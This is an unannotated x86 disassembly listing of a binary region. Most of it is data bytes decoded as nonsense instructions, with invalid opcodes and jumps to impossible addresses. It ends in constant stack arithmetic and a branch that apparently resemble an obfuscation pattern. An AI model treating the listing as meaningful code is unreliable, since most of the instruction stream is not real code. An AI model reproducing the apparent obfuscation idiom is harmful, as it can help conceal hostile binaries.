  41c9e1:	adc    edi,DWORD PTR [esi+0x1c]
  41c9e4:	sar    DWORD PTR [edi],0x55
  41c9e7:	mul    edi
  41c9e9:	and    DWORD PTR [ebp+0x35],0x2
  41c9ed:	lea    esp,[ecx]
  41c9ef:	(bad)  
  41c9f1:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c9f3:	jmp    0xaffe6387
  41c9f8:	adc    al,0x2b
  41c9fa:	bound  ebx,QWORD PTR [esi-0x4a7b7f5b]
  41ca00:	test   BYTE PTR [eax+0x4671d8fa],cl
  41ca06:	xchg   ecx,eax
  41ca07:	inc    edi
  41ca08:	aad    0x44
  41ca0a:	pop    ebx
  41ca0b:	repnz ror BYTE PTR [esi+0x21],0x46
  41ca10:	fild   WORD PTR [ecx-0x25f2b97f]
  41ca16:	sbb    DWORD PTR [esp+0x3e],esi
  41ca1a:	sbb    BYTE PTR ds:0xc2d2bcc,0x2c
  41ca21:	stc    
  41ca22:	cmp    BYTE PTR [edx-0xa],ah
  41ca25:	pop    edx
  41ca26:	adc    al,0x2c
  41ca28:	xchg   ecx,eax
  41ca29:	lods   al,BYTE PTR ds:[esi]
  41ca2a:	test   al,0xeb
  41ca2c:	xchg   esi,eax
  41ca2d:	cmp    al,0x26
  41ca2f:	and    al,0xbb
  41ca31:	aas    
  41ca32:	fadd   st(6),st
  41ca34:	inc    ebp
  41ca35:	add    BYTE PTR [eax+0x28],dl
  41ca38:	loop   0x41ca9e
  41ca3a:	jmp    0x41ca9c
  41ca3c:	aas    
  41ca3d:	pop    ecx
  41ca3e:	push   cs
  41ca3f:	call   0x9ffd2921
  41ca44:	pop    ds
  41ca45:	out    0xd5,eax
  41ca47:	dec    edx
  41ca48:	test   eax,0x22a00bff
  41ca4d:	jno    0x41ca14
  41ca4f:	loopne 0x41ca26
  41ca51:	dec    edi
  41ca52:	fwait
  41ca53:	pop    es
  41ca54:	push   ss
  41ca55:	push   esp
  41ca56:	inc    ecx
  41ca57:	das    
  41ca58:	dec    eax
  41ca59:	call   0x6eb7:0xc39601b
  41ca60:	jmp    0x1ea4:0x4d962388
  41ca67:	mov    al,ds:0x327810b1
  41ca6c:	mov    cl,0x68
  41ca6e:	xchg   DWORD PTR [edx],eax
  41ca70:	scas   al,BYTE PTR es:[edi]
  41ca71:	xor    DWORD PTR [ebx],eax
  41ca73:	sbb    al,0x9e
  41ca75:	aas    
  41ca76:	retf   
  41ca77:	cmp    al,0xdf
  41ca79:	inc    esi
  41ca7a:	fs push ecx
  41ca7c:	test   BYTE PTR [edi+0x1],ah
  41ca7f:	or     DWORD PTR ds:0x883ff15c,0x4acdca9c
  41ca89:	shr    DWORD PTR [ebx-0x4c],cl
  41ca8c:	xor    al,0x2
  41ca8e:	je     0x41ca5b
  41ca90:	out    dx,eax
  41ca91:	jmp    0x4521:0x1fe1f133
  41ca98:	xchg   edx,eax
  41ca99:	inc    eax
  41ca9a:	sub    esi,DWORD PTR [ebx-0x15b485d2]
  41caa0:	mov    eax,ds:0x2e9fca64
  41caa5:	outs   dx,DWORD PTR ds:[esi]
  41caa6:	dec    ecx
  41caa7:	pop    edi
  41caa8:	icebp  
  41caa9:	int3   
  41caaa:	or     esi,DWORD PTR [edi-0x75]
  41caad:	mov    DWORD PTR [ebp-0xccbfa36],edi
  41cab3:	jbe    0x41caf1
  41cab5:	inc    eax
  41cab6:	add    ch,BYTE PTR [edi+esi*2]
  41cab9:	add    DWORD PTR [edx+0x7071a73d],edi
  41cabf:	cmp    BYTE PTR [eax],dl
  41cac1:	ror    BYTE PTR [ebx-0x6e],cl
  41cac4:	stos   DWORD PTR es:[edi],eax
  41cac5:	mov    bh,0xd9
  41cac7:	jnp    0x41cafd
  41cac9:	ds adc al,al
  41cacc:	ds test al,0x37
  41cacf:	cmp    BYTE PTR [bp-0x1e],0x35
  41cad4:	inc    ecx
  41cad5:	or     DWORD PTR [edx-0x71c3efeb],eax
  41cadb:	cmp    DWORD PTR ds:0x8576ab07,ebp
  41cae1:	(bad)  
  41cae2:	stc    
  41cae3:	push   ebp
  41cae4:	mov    eax,ecx
  41cae6:	outs   dx,DWORD PTR ds:[esi]
  41cae7:	test   ecx,edx
  41cae9:	frstor [edx+0x126e9192]
  41caef:	(bad)  
  41caf1:	rcr    DWORD PTR [edi-0x74d942cb],cl
  41caf7:	or     DWORD PTR [eax],ebp
  41caf9:	sub    eax,DWORD PTR [edx-0x20e00e73]
  41caff:	mov    ch,0x55
  41cb01:	xor    DWORD PTR [ecx],0x3c
  41cb04:	pop    ss
  41cb05:	push   cs
  41cb06:	inc    esi
  41cb07:	mov    ch,0xda
  41cb09:	adc    bh,BYTE PTR [eax-0x2eb45ca1]
  41cb0f:	mov    ebx,0xded33e70
  41cb14:	push   0xbc132ff9
  41cb19:	xchg   edi,eax
  41cb1a:	xchg   esi,eax
  41cb1b:	push   esi
  41cb1c:	or     DWORD PTR [ebx-0x4fb59385],ebx
  41cb22:	cmc    
  41cb23:	xor    al,0xd0
  41cb25:	pop    esp
  41cb26:	push   ecx
  41cb27:	pop    edx
  41cb28:	out    0x8a,al
  41cb2a:	aas    
  41cb2b:	jle    0x41cb94
  41cb2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb2e:	xchg   ebx,eax
  41cb2f:	out    dx,eax
  41cb30:	mov    ch,0x70
  41cb32:	xor    eax,0x89a206ec
  41cb37:	jne    0x41caed
  41cb39:	inc    ebx
  41cb3a:	mov    cl,0x50
  41cb3c:	mov    esi,0x6955a41b
  41cb41:	pusha  
  41cb42:	dec    esp
  41cb43:	fsub   QWORD PTR [edi]
  41cb45:	xor    BYTE PTR [esi+0x2f],bl
  41cb48:	stos   DWORD PTR es:[edi],eax
  41cb49:	jns    0x41cb21
  41cb4b:	xlat   BYTE PTR ds:[ebx]
  41cb4c:	pop    ebp
  41cb4d:	(bad)  
  41cb4e:	mov    ah,0xf1
  41cb50:	or     al,0x6b
  41cb52:	pop    edi
  41cb53:	adc    ebx,DWORD PTR [ebp+0x76]
  41cb56:	addr16 loope 0x41cb43
  41cb59:	cmp    DWORD PTR [ebx-0x68],edi
  41cb5c:	(bad)  
  41cb5e:	push   edi
  41cb5f:	inc    esi
  41cb60:	and    eax,DWORD PTR [eax-0x5d5d1a6b]
  41cb66:	xor    al,0x4e
  41cb68:	jns    0x41cbaa
  41cb6a:	(bad)
  41cb6d:	adc    dh,dh
  41cb6f:	call   0x74a9:0x730491f6
  41cb76:	lods   al,BYTE PTR ds:[esi]
  41cb77:	ret    
  41cb78:	in     eax,0xf
  41cb7a:	pop    ecx
  41cb7b:	hlt    
  41cb7c:	ds sub al,0x5
  41cb7f:	mov    edi,ds
  41cb81:	int3   
  41cb82:	mul    ah
  41cb84:	fdivr  st(3),st
  41cb86:	adc    al,0x35
  41cb88:	retf   0xa058
  41cb8b:	cmp    BYTE PTR [edi-0x59],ah
  41cb8e:	mov    cl,0x9c
  41cb90:	xchg   ebp,eax
  41cb91:	and    edx,DWORD PTR [ecx]
  41cb93:	mov    bl,0x35
  41cb95:	mov    DWORD PTR [edi-0x25],edi
  41cb98:	ins    BYTE PTR es:[edi],dx
  41cb99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cb9a:	mov    DWORD PTR [edx+eax*1+0x6d5e41a6],edx
  41cba1:	leave  
  41cba2:	or     DWORD PTR [ebx-0x71fec3a3],eax
  41cba8:	or     esi,DWORD PTR [ebp-0x66ce5f29]
  41cbae:	or     DWORD PTR [edi-0x31],edi
  41cbb1:	frstpm(287 only) 
  41cbb3:	pop    edx
  41cbb4:	sbb    al,0x29
  41cbb6:	and    ecx,0xac0e2899
  41cbbc:	iret   
  41cbbd:	into   
  41cbbe:	mov    esi,0xf3aa5701
  41cbc3:	test   BYTE PTR [eax],ah
  41cbc5:	cmp    BYTE PTR [edi+0x37],al
  41cbc8:	mov    esp,0x6a31f2d2
  41cbcd:	dec    dx
  41cbcf:	fisttp DWORD PTR [ecx+0x665bd739]
  41cbd5:	fs mov bh,0xfe
  41cbd8:	pop    edi
  41cbd9:	mov    bl,BYTE PTR [ecx+edi*2-0x4e]
  41cbdd:	pusha  
  41cbde:	pop    esp
  41cbdf:	call   0x745ec3a6
  41cbe4:	jl     0x41cc19
  41cbe6:	(bad)  
  41cbe7:	je     0x41cb75
  41cbe9:	jmp    0x41cc18
  41cbeb:	(bad)  
  41cbec:	lock mov ds:0x87feb7d2,al
  41cbf2:	enter  0xafef,0x1
  41cbf6:	gs dec ecx
  41cbf8:	or     eax,0xd09d28a6
  41cbfd:	lods   al,BYTE PTR ds:[esi]
  41cbfe:	or     DWORD PTR [eax+0x1aa4e75f],ebp
  41cc04:	push   edi
  41cc05:	mov    ebx,0x2faea0cf
  41cc0a:	test   edx,edx
  41cc0c:	mov    BYTE PTR [edi+0x2c140a7f],al
  41cc12:	jmp    0x5ecc2dd2
  41cc17:	cmp    al,0xb0
  41cc19:	(bad)  
  41cc1a:	les    ecx,FWORD PTR [edi]
  41cc1c:	loop   0x41cc65
  41cc1e:	dec    edx
  41cc1f:	int3   
  41cc20:	mov    al,ds:0x4dae63d4
  41cc25:	clc    
  41cc26:	sub    ax,0x72ed
  41cc2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc2b:	popf   
  41cc2c:	out    0x3c,al
  41cc2e:	fisubr WORD PTR [edx+0x66]
  41cc31:	adc    al,BYTE PTR [edi+0xa2410dc]
  41cc37:	(bad)  
  41cc38:	outs   dx,DWORD PTR ds:[esi]
  41cc39:	int3   
  41cc3a:	sub    al,0x88
  41cc3c:	lock sbb ebx,ebx
  41cc3f:	nop
  41cc40:	leave  
  41cc41:	or     eax,0xf2691b06
  41cc46:	test   BYTE PTR [edx],bh
  41cc48:	inc    ch
  41cc4a:	xchg   ebx,eax
  41cc4b:	sahf   
  41cc4c:	out    0x87,eax
  41cc4e:	or     edi,DWORD PTR es:[eax]
  41cc51:	js     0x41cc47
  41cc53:	mov    edi,0xcae30ae5
  41cc58:	loop   0x41cbfc
  41cc5a:	xchg   edx,eax
  41cc5b:	cwde   
  41cc5c:	sbb    ch,BYTE PTR [esi*8+0x14af6433]
  41cc63:	inc    ebp
  41cc64:	fcomp  DWORD PTR [ecx+eiz*4+0x3e]
  41cc68:	es loop 0x41cc50
  41cc6b:	jae    0x41cc3c
  41cc6d:	vmread DWORD PTR [edi],ebx
  41cc70:	adc    bh,dl
  41cc72:	mov    bl,0xf7
  41cc74:	mov    cs,WORD PTR [ebp+0x7c]
  41cc77:	ja     0x41cc96
  41cc79:	fcomp  DWORD PTR [ecx-0x44]
  41cc7c:	add    edx,edi
  41cc7e:	dec    esi
  41cc7f:	dec    ebp
  41cc80:	pop    eax
  41cc81:	es popf 
  41cc83:	xor    eax,0x350329ca
  41cc88:	std    
  41cc89:	mov    ch,0xde
  41cc8b:	popa   
  41cc8c:	nop
  41cc8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc8e:	jmp    0xfa38b34d
  41cc93:	je     0x41ccba
  41cc95:	popa   
  41cc96:	(bad)
  41cc99:	xchg   ecx,eax
  41cc9a:	pop    edi
  41cc9b:	cmp    esp,ebp
  41cc9d:	out    dx,al
  41cc9e:	and    ecx,edi
  41cca0:	fs mov bh,0x5a
  41cca3:	ja     0x41cc37
  41cca5:	mov    al,0xd9
  41cca7:	fld    DWORD PTR [edx+0x7711f952]
  41ccad:	and    al,0x28
  41ccaf:	ins    BYTE PTR es:[edi],dx
  41ccb0:	lea    ebp,[eax+0x54bcf5c5]
  41ccb6:	cdq    
  41ccb7:	out    dx,al
  41ccb8:	ss in  eax,dx
  41ccba:	mov    al,bl
  41ccbc:	pop    edx
  41ccbd:	test   BYTE PTR [eax],ch
  41ccbf:	jbe    0x41cc96
  41ccc1:	jb     0x41ccf2
  41ccc3:	(bad)  
  41ccc4:	in     eax,dx
  41ccc5:	fadd   st(1),st
  41ccc7:	mov    eax,ds:0xc1687a53
  41cccc:	popa   
  41cccd:	cmp    DWORD PTR [ebx],0x860d3cd9
  41ccd3:	mov    ebx,0xf021b9bf
  41ccd8:	cli    
  41ccd9:	rcr    bl,1
  41ccdb:	xchg   DWORD PTR ds:0x7101976a,edi
  41cce1:	test   BYTE PTR [esi-0x73],dh
  41cce4:	add    eax,0x726867d9
  41cce9:	mov    ds:0x455d1784,al
  41ccee:	mov    edx,ebx
  41ccf0:	sub    ah,bl
  41ccf2:	aaa    
  41ccf3:	adc    edx,esi
  41ccf5:	mov    ds:0x8a3dad91,al
  41ccfa:	dec    esp
  41ccfb:	and    al,0x3c
  41ccfd:	or     al,0xdc
  41ccff:	jmp    0x41d0ce
  41cd04:	fimul  WORD PTR [esi+0x16]
  41cd07:	jle    0x41cd30
  41cd09:	ds pop esi
  41cd0b:	cs je  0x41cd75
  41cd0e:	xchg   edi,eax
  41cd0f:	mov    esp,0x7cc7cb13
  41cd14:	xchg   ebx,eax
  41cd15:	arpl   WORD PTR [esi],dx
  41cd17:	sbb    BYTE PTR [edx+edx*1+0x18d61818],bh
  41cd1e:	aam    0xe0
  41cd20:	rcr    BYTE PTR [ebx-0x3106b8be],0xed
  41cd27:	rcl    DWORD PTR [esi-0x4d],cl
  41cd2a:	loopne 0x41cd81
  41cd2c:	xchg   ebp,eax
  41cd2d:	push   es
  41cd2e:	lds    eax,FWORD PTR [ebx]
  41cd30:	fdivr  DWORD PTR [esi]
  41cd32:	or     DWORD PTR [ebx],ebx
  41cd34:	push   0x4845c79b
  41cd39:	and    ch,bl
  41cd3b:	in     al,dx
  41cd3c:	sar    DWORD PTR [edx+0x0],0x9
  41cd40:	push   ss
  41cd41:	sbb    eax,0xce67e29b
  41cd46:	in     al,0xc6
  41cd48:	xchg   ebx,eax
  41cd49:	out    0xb6,al
  41cd4b:	adc    eax,0xbc830c2a
  41cd50:	push   edi
  41cd51:	inc    eax
  41cd52:	outs   dx,BYTE PTR ds:[esi]
  41cd53:	mov    BYTE PTR [ebx-0x54],dh
  41cd56:	imul   ecx,DWORD PTR [ebx+0x65048e0a],0x17
  41cd5d:	sbb    cl,BYTE PTR [ecx+0xa]
  41cd60:	fnclex 
  41cd62:	push   esp
  41cd63:	les    eax,FWORD PTR [eax+0x45]
  41cd66:	imul   esi,DWORD PTR [ebp-0x6],0x32
  41cd6a:	xchg   ecx,eax
  41cd6b:	jle    0x41cd2d
  41cd6d:	lea    ebp,[ecx]
  41cd6f:	mov    dh,0x62
  41cd71:	out    dx,al
  41cd72:	mov    ah,0x94
  41cd74:	in     al,dx
  41cd75:	jbe    0x41cdc7
  41cd77:	sub    BYTE PTR [ebp-0x65f93a01],0x33
  41cd7e:	mov    ah,0x62
  41cd80:	je     0x41cde0
  41cd82:	jle    0x41cd98
  41cd84:	sti    
  41cd85:	inc    esi
  41cd86:	test   DWORD PTR [eax+0x1b38f035],eax
  41cd8c:	push   ecx
  41cd8d:	push   0xffffffa6
  41cd8f:	psadbw mm1,mm3
  41cd92:	mov    ecx,0x80cb2016
  41cd97:	stos   BYTE PTR es:[edi],al
  41cd98:	test   al,0xd
  41cd9a:	loop   0x41ce02
  41cd9c:	pop    edx
  41cd9d:	mov    ebx,0x63c43732
  41cda2:	loopne 0x41cda2
  41cda4:	and    edx,esi
  41cda6:	add    eax,DWORD PTR [ebx+eax*4]
  41cda9:	ins    BYTE PTR es:[edi],dx
  41cdaa:	dec    ebx
  41cdab:	jl     0x41cd45
  41cdad:	jns    0x41ce05
  41cdaf:	and    esi,DWORD PTR [ecx-0x31]
  41cdb2:	sti    
  41cdb3:	ja     0x41ce31
  41cdb5:	ds xchg esp,eax
  41cdb7:	xchg   DWORD PTR [ebx-0x64f7574b],ecx
  41cdbd:	mov    ecx,0x17df45b6
  41cdc2:	adc    BYTE PTR [edi+0x0],al
  41cdc5:	stc    
  41cdc6:	popa   
  41cdc7:	daa    
  41cdc8:	arpl   bp,cx
  41cdca:	pop    ebp
  41cdcb:	adc    ebp,eax
  41cdcd:	push   ebx
  41cdce:	pop    es
  41cdcf:	cmp    eax,0xceb43709
  41cdd4:	jo     0x41cdad
  41cdd6:	mov    al,0x9a
  41cdd8:	sbb    ah,dh
  41cdda:	adc    bl,BYTE PTR [edi-0xb3fe4b1]
  41cde0:	jmp    0xd747e2f8
  41cde5:	and    BYTE PTR [edx],0xa0
  41cde8:	inc    ebp
  41cde9:	mov    al,ds:0x36568892
  41cdee:	cmp    al,0x71
  41cdf0:	mov    al,ds:0x70e39ec9
  41cdf5:	adc    esi,DWORD PTR [esi+eiz*1-0x4797ee46]
  41cdfc:	jno    0x41ce67
  41cdfe:	dec    ecx
  41cdff:	dec    eax
  41ce00:	jb     0x41ce3a
  41ce02:	mov    bl,0x78
  41ce04:	pop    ebp
  41ce05:	outs   dx,BYTE PTR ds:[esi]
  41ce06:	fadd   QWORD PTR [edx+0x65]
  41ce09:	sbb    al,0xb4
  41ce0b:	add    BYTE PTR [edx],ah
  41ce0d:	ja     0x41ce77
  41ce0f:	dec    eax
  41ce10:	xchg   ebx,eax
  41ce11:	add    DWORD PTR [ecx],ebp
  41ce13:	inc    eax
  41ce14:	out    0xd9,al
  41ce16:	push   ecx
  41ce17:	call   0x202490fd
  41ce1c:	(bad)  
  41ce1d:	cdq    
  41ce1e:	adc    BYTE PTR [edi-0x401985b6],0x76
  41ce25:	mov    ah,0xa8
  41ce27:	cmp    eax,edi
  41ce29:	xor    eax,esp
  41ce2b:	paddusw mm2,QWORD PTR [eax-0x2b]
  41ce2f:	es inc edi
  41ce31:	scas   eax,DWORD PTR es:[edi]
  41ce32:	jl     0x41ce02
  41ce34:	popf   
  41ce35:	jg     0x41cdea
  41ce37:	loop   0x41ce01
  41ce39:	repnz out 0xad,eax
  41ce3c:	xchg   edx,eax
  41ce3d:	push   ss
  41ce3e:	push   0xffffff96
  41ce40:	outs   dx,DWORD PTR ds:[esi]
  41ce41:	jbe    0x41cdc7
  41ce43:	push   eax
  41ce44:	(bad)  
  41ce45:	pop    esp
  41ce46:	out    0x84,al
  41ce48:	sub    ebp,DWORD PTR [esp+ebp*8-0x53974178]
  41ce4f:	add    bl,BYTE PTR [edx]
  41ce51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce52:	dec    esp
  41ce53:	mov    WORD PTR [eax-0x18af4033],?
  41ce59:	loopne 0x41ce45
  41ce5b:	fbstp  TBYTE PTR [edx]
  41ce5d:	into   
  41ce5e:	sbb    DWORD PTR [eax],ebp
  41ce60:	bound  esp,QWORD PTR [esi+edi*1]
  41ce63:	stos   DWORD PTR es:[edi],eax
  41ce64:	sub    eax,0x375bd56
  41ce69:	cmp    dl,BYTE PTR [eax]
  41ce6b:	stos   BYTE PTR es:[edi],al
  41ce6c:	loop   0x41ce70
  41ce6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce6f:	pop    esp
  41ce70:	ds pop es
  41ce72:	cwde   
  41ce73:	mov    ds:0x367f5ec2,eax
  41ce78:	sub    DWORD PTR [eax],0xfffffffa
  41ce7b:	pop    esp
  41ce7c:	lea    esp,[ebx-0x5e]
  41ce7f:	mov    bl,0xb3
  41ce81:	lods   eax,DWORD PTR ds:[esi]
  41ce82:	xchg   esp,eax
  41ce83:	jbe    0x41ce06
  41ce85:	sub    BYTE PTR [ebp-0x5a],0x8d
  41ce89:	push   edx
  41ce8a:	in     eax,0x9
  41ce8c:	jmp    0x255a8251
  41ce91:	fstp   DWORD PTR [edi]
  41ce93:	or     eax,0x32c2ee07
  41ce99:	sub    eax,0xf57602e4
  41ce9e:	add    ecx,DWORD PTR [ebp+0x2e1a70d0]
  41cea4:	cwde   
  41cea5:	push   ss
  41cea6:	and    eax,0x61aab100
  41ceab:	jmp    0x57f9:0x4a324953
  41ceb2:	popa   
  41ceb3:	int3   
  41ceb4:	push   esp
  41ceb5:	dec    eax
  41ceb6:	xchg   ebp,edi
  41ceb8:	in     al,dx
  41ceb9:	mov    al,ds:0x101f5aa6
  41cebe:	push   edx
  41cebf:	ss push edi
  41cec1:	hlt    
  41cec2:	mov    bl,0x31
  41cec4:	push   cs
  41cec5:	imul   BYTE PTR [ebp+0x5a]
  41cec8:	(bad)  
  41cec9:	sbb    edi,DWORD PTR [eax]
  41cecb:	sbb    eax,0x4e03d061
  41ced0:	mov    ebp,0xd3b2b8a
  41ced5:	outs   dx,BYTE PTR ds:[esi]
  41ced6:	jecxz  0x41cf34
  41ced8:	sbb    BYTE PTR [esp+ebp*8],ch
  41cedb:	imul   ebx,DWORD PTR es:[edi-0x56],0xffffff89
  41cee0:	sub    edx,esp
  41cee2:	enter  0x82ab,0x88
  41cee6:	or     BYTE PTR [edx-0x1b474b19],0x4d
  41ceed:	add    DWORD PTR [edi],edx
  41ceef:	imul   esp,DWORD PTR [ebx-0xed981a],0x55
  41cef6:	mov    esp,0x63fbdcb0
  41cefb:	push   esi
  41cefc:	sbb    cl,BYTE PTR [edx]
  41cefe:	inc    ecx
  41ceff:	or     edi,DWORD PTR [ebx-0x30]
  41cf02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf03:	fwait
  41cf04:	push   edi
  41cf05:	sub    BYTE PTR [edx+0x1bb4f999],al
  41cf0b:	jae    0x41cf88
  41cf0d:	fld    DWORD PTR [eax+ebx*1]
  41cf10:	pop    edx
  41cf11:	cld    
  41cf12:	jle    0x41cf23
  41cf14:	lock pop ds
  41cf16:	outs   dx,DWORD PTR ds:[esi]
  41cf17:	sub    eax,0xde322758
  41cf1c:	retf   
  41cf1d:	add    eax,0x9a220fc8
  41cf22:	pop    eax
  41cf23:	sbb    cl,BYTE PTR [ecx-0x48]
  41cf26:	mov    dh,dl
  41cf28:	(bad)  
  41cf2a:	dec    esp
  41cf2b:	jno    0x41cf1d
  41cf2d:	shr    BYTE PTR [eax-0x18989e24],0x78
  41cf34:	xor    BYTE PTR [edx],bl
  41cf36:	in     al,0xb3
  41cf38:	retf   
  41cf39:	mov    DWORD PTR [eax+0x31b78c72],ecx
  41cf3f:	sbb    esi,esi
  41cf41:	mov    al,ds:0x2aa985ee
  41cf46:	and    al,0x6a
  41cf48:	mov    ds:0xd010ca9d,eax
  41cf4d:	mov    cs,WORD PTR [edi-0x39]
  41cf50:	call   0xbb98a1bd
  41cf55:	mov    ?,WORD PTR [esi-0xb]
  41cf58:	scas   al,BYTE PTR es:[edi]
  41cf59:	leave  
  41cf5a:	mov    edi,0x3f1b0e88
  41cf5f:	push   eax
  41cf60:	jp     0x41ceff
  41cf62:	int3   
  41cf63:	cmp    eax,DWORD PTR [edx]
  41cf65:	and    ebx,DWORD PTR [edi]
  41cf67:	or     eax,0x67e1a55e
  41cf6c:	add    ebp,DWORD PTR [edx+0x2]
  41cf6f:	mov    al,0xae
  41cf71:	cmp    al,0xa6
  41cf73:	add    dh,BYTE PTR [edx-0x577d4a43]
  41cf79:	bound  edx,QWORD PTR [si-0x78]
  41cf7d:	xor    esp,edi
  41cf7f:	scas   al,BYTE PTR es:[edi]
  41cf80:	mov    dl,0x95
  41cf82:	adc    dl,BYTE PTR [eax+0xc178bb5]
  41cf88:	xor    eax,0x70f51b30
  41cf8d:	out    dx,eax
  41cf8e:	pusha  
  41cf8f:	ss push esp
  41cf91:	ds xchg ecx,eax
  41cf93:	sbb    al,0x36
  41cf95:	retf   0xee6b
  41cf98:	mov    cl,0xcf
  41cf9a:	fld    TBYTE PTR [ebx-0x80]
  41cf9d:	push   cs
  41cf9e:	es dec ecx
  41cfa0:	scas   eax,DWORD PTR es:[edi]
  41cfa1:	xchg   edx,eax
  41cfa2:	dec    esp
  41cfa3:	add    al,0x2f
  41cfa5:	add    al,bl
  41cfa7:	xchg   edx,eax
  41cfa8:	imul   ebx,ebx,0x3f22790a
  41cfae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cfaf:	cmp    al,0x76
  41cfb1:	shr    esp,0xc7
  41cfb4:	mov    DWORD PTR [esi],ebp
  41cfb6:	and    dh,BYTE PTR [esi+0x4a0c2a35]
  41cfbc:	fwait
  41cfbd:	mov    eax,0x50a13cd4
  41cfc2:	mov    bh,0xc0
  41cfc4:	leave  
  41cfc5:	in     al,dx
  41cfc6:	sub    BYTE PTR [ebp+0x6e],cl
  41cfc9:	add    esi,DWORD PTR [edx]
  41cfcb:	into   
  41cfcc:	inc    ebx
  41cfcd:	inc    ecx
  41cfce:	push   edi
  41cfcf:	rcl    BYTE PTR [edx+edx*1],0x90
  41cfd3:	jl     0x41d048
  41cfd5:	imul   ecx,DWORD PTR [ebp-0x32],0xffffff8d
  41cfd9:	mov    eax,0x482c7fb4
  41cfde:	out    dx,al
  41cfdf:	(bad)  
  41cfe0:	shl    BYTE PTR [esi],1
  41cfe2:	mov    ds:0xcb73535e,eax
  41cfe7:	in     al,0xef
  41cfe9:	fxch   st(0)
  41cfeb:	mov    dl,0x2c
  41cfed:	sbb    al,0x3f
  41cfef:	add    DWORD PTR [esi-0x42],0x45
  41cff3:	addr16 mov cl,0x60
  41cff6:	xor    BYTE PTR cs:[ebx+0x63],ch
  41cffa:	inc    ch
  41cffc:	(bad)  [ebx-0x1f]
  41cfff:	icebp  
  41d000:	or     DWORD PTR [ecx-0x25],edi
  41d003:	ds std 
  41d005:	xchg   ecx,eax
  41d006:	(bad)  
  41d008:	out    0x18,eax
  41d00a:	sbb    BYTE PTR [esi-0x6bcff215],0x28
  41d011:	push   ds
  41d012:	sbb    eax,0x956a782a
  41d017:	(bad)  
  41d018:	repz cmp bl,0x8c
  41d01c:	push   0x9da91345
  41d021:	mov    es,WORD PTR [esi-0x53]
  41d024:	pop    ebx
  41d025:	mov    ch,0x6e
  41d027:	mov    BYTE PTR [ebx-0x20f544f9],dl
  41d02d:	scas   eax,DWORD PTR es:[edi]
  41d02e:	mov    dh,0x23
  41d030:	(bad)  
  41d031:	push   0xa3531017
  41d036:	or     BYTE PTR ds:0xd65d190,al
  41d03c:	adc    ah,BYTE PTR [ebp-0x1b8a5c16]
  41d042:	pop    edx
  41d043:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d044:	rcr    BYTE PTR [edi],1
  41d046:	loope  0x41d071
  41d048:	jg     0x41d059
  41d04a:	cmp    al,0x2
  41d04c:	or     eax,0x4b6f5bcb
  41d051:	jp     0x41d0a1
  41d053:	unpckhps xmm0,XMMWORD PTR [ebx-0x37d8ebb3]
  41d05a:	sahf   
  41d05b:	xor    eax,0xe1c2fcc5
  41d060:	hlt    
  41d061:	pop    es
  41d062:	sar    DWORD PTR [edi],0xfb
  41d065:	xor    eax,0x64aafe5b
  41d06a:	cmp    eax,0x4a259d5a
  41d06f:	cmc    
  41d070:	mov    ecx,0xa312cba9
  41d075:	mov    ebx,0x51c8a8f1
  41d07a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d07b:	das    
  41d07c:	(bad)  
  41d07d:	scas   al,BYTE PTR es:[edi]
  41d07e:	add    edx,0xfbf48783
  41d084:	das    
  41d085:	mov    gs,WORD PTR [eax-0xaea8bf3]
  41d08b:	jl     0x41d016
  41d08d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d08e:	xchg   edx,eax
  41d08f:	fst    DWORD PTR [ebp-0xff9eda9]
  41d095:	data16 and al,0x14
  41d098:	loope  0x41d022
  41d09a:	sub    BYTE PTR [eax+edx*8],bh
  41d09d:	outs   dx,DWORD PTR ds:[esi]
  41d09e:	rol    BYTE PTR [esi+0x6eb25a35],0x6d
  41d0a5:	push   ebx
  41d0a6:	in     al,0x25
  41d0a8:	jl     0x41d057
  41d0aa:	sbb    cl,BYTE PTR [ecx]
  41d0ac:	fimul  DWORD PTR [esi+eax*2-0x74]
  41d0b0:	xchg   ecx,eax
  41d0b1:	retf   0x95d7
  41d0b4:	fucomip st,st(7)
  41d0b6:	sub    eax,0x405a83af
  41d0bb:	add    eax,0xa3a2d21a
  41d0c0:	xchg   esi,eax
  41d0c1:	sahf   
  41d0c2:	cli    
  41d0c3:	sti    
  41d0c4:	clc    
  41d0c5:	push   ss
  41d0c6:	lock enter 0x4f07,0x63
  41d0cb:	cmp    al,0xba
  41d0cd:	sub    ch,BYTE PTR [edx]
  41d0cf:	ror    DWORD PTR [edx+0x2c38244c],0x56
  41d0d6:	movzx  eax,al
  41d0d9:	movzx  ecx,cl
  41d0dc:	cdq    
  41d0dd:	idiv   ecx
  41d0df:	movzx  ecx,BYTE PTR [esp+0x2c]
  41d0e4:	or     eax,ecx
  41d0e6:	mov    BYTE PTR [esp+0xc],al
  41d0ea:	mov    BYTE PTR [esp+0x24],0x1
  41d0ef:	mov    BYTE PTR [esp+0x2b],0xcf
  41d0f4:	mov    BYTE PTR [esp+0x3c],0x6
  41d0f9:	mov    BYTE PTR [esp+0x38],0x25
  41d0fe:	mov    BYTE PTR [esp+0x2c],0xf8
  41d103:	mov    al,BYTE PTR [esp+0x2c]
  41d107:	mov    cl,BYTE PTR [esp+0x38]
  41d10b:	or     al,0xc4
  41d10d:	and    al,cl
  41d10f:	mov    cl,BYTE PTR [esp+0x3c]
  41d113:	imul   cl
  41d115:	mov    cl,BYTE PTR [esp+0x2b]
  41d119:	movzx  ecx,cl
  41d11c:	movzx  eax,al
  41d11f:	and    eax,ecx
  41d121:	mov    cl,BYTE PTR [esp+0x24]
  41d125:	movzx  ecx,cl
  41d128:	cdq    
  41d129:	idiv   ecx
  41d12b:	mov    cl,BYTE PTR [esp+0xc]
  41d12f:	cmp    cl,al
  41d131:	je     0x41d926
  41d137:	lea    eax,[esp+0x9c]
  41d13e:	push   eax
  41d13f:	lea    edi,[esp+0x80]
  41d146:	call   0x40f356
  41d14b:	cmp    eax,ebx
